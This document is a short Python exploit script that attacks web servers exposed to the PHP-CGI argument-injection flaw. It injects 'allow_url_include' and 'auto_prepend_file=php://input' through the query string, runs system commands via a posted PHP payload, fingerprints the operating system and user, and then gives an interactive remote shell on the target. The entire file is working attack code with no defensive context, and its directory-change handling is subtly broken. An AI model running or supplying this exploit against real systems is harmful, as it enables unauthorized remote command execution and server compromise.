#!/usr/bin/python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: sh.py <target>")
    sys.exit(0)

target = sys.argv[1]
url = 'http://' + target + '/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
payload = "<?php system('cmd');die(); ?>"
try:
    vuln1 = requests.post(url, data=payload.replace('cmd', 'uname -a'))
except Exception as msg:
    print('%s: %s' % (target, msg))
    quit()
    
print('%s: Connection suceeded' % target)


if len(vuln1.text) > 120:
    print("SHELL FAILED: Can not create a shell")
    quit()
    
if not 'linux' in vuln1.text.lower() and not 'mac' in vuln1.text.lower():
    vuln2 = requests.post(url, data=payload.replace('cmd', 'ver'))
    if not 'windows' in vuln2.text.lower():
        print("SHELL FAILED: Can't not create a shell")
        quit()
    oper = 'win'
    print('''%s
(c) Microsoft Corporation. All rights reserved.
''' % vuln2)
    end = '\n'
    
else:
    oper = 'unix'
    usr = requests.post(url, data=payload.replace('cmd', 'whoami')).text
    end = ''
    print('')
    
    
while True:
    try:
        pth = requests.post(url, data="<?php echo getcwd(); ?>").text
        if oper == 'win':
            cmd = input("%s> " % pth)
        else:
            priv = '$'
            if usr == 'root':
                priv = '#'
            if usr != 'root' and '/home/%s' % usr in pth:
                pth = '~%s' % pth.replace('/home/%s', '')
            cmd = input("%s@%s:%s%s" % (usr, target, pth, priv))

        if cmd.replace(' ', '')[2:] == 'cd':
            cmd = "<?php chdir(%s); ?>" % cmd.replace(' ', '')[:2]
        data = payload.replace('cmd', cmd)
        resp = requests.post(url, data=data)
        print(resp.text + end)
    except KeyboardInterrupt:
        print("^C")
        sys.exit(1)
    except:
        print("SHELL FAILED: An unknown error occur")
        quit()

